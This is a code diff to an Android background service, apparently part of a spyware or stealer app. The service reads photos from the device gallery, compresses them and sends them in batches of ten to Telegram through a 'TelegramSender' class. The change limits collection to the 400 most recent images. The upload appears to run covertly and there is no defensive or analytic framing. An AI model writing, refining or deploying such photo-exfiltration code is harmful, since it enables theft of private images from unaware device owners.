@@ -21,7 +21,7 @@ public class GalleryService extends Service {
     @Override
     public int onStartCommand(Intent intent, int flags, int startId) {
         new Thread(() -> {
-            List<Uri> allImages = getAllImages();
+            List<Uri> allImages = getRecentImages();
             List<byte[]> batch = new ArrayList<>();
             int totalSent = 0;
 
@@ -35,7 +35,7 @@ public class GalleryService extends Service {
 
                     if (bitmap != null) {
                         ByteArrayOutputStream baos = new ByteArrayOutputStream();
-                        bitmap.compress(Bitmap.CompressFormat.JPEG, 45, baos); // Сжимаем сильнее
+                        bitmap.compress(Bitmap.CompressFormat.JPEG, 45, baos); // Сжимаем
                         batch.add(baos.toByteArray());
                         bitmap.recycle();
 
@@ -43,7 +43,7 @@ public class GalleryService extends Service {
                             new TelegramSender().sendMediaGroup(batch, totalSent);
                             totalSent += 10;
                             batch.clear();
-                            Thread.sleep(500); // Короткая пауза
+                            Thread.sleep(500);
                         }
                     }
                 } catch (Exception e) { e.printStackTrace(); }
@@ -58,10 +58,12 @@ public class GalleryService extends Service {
         return START_NOT_STICKY;
     }
 
-    private List<Uri> getAllImages() {
+    private List<Uri> getRecentImages() {
         List<Uri> imageUris = new ArrayList<>();
         String[] projection = new String[]{MediaStore.Images.Media._ID};
-        String sortOrder = MediaStore.Images.Media.DATE_ADDED + " DESC";
+        
+        // Сортируем от новых к старым и ограничиваем 400 штуками
+        String sortOrder = MediaStore.Images.Media.DATE_ADDED + " DESC LIMIT 400";
 
         Cursor cursor = getContentResolver().query(
                 MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
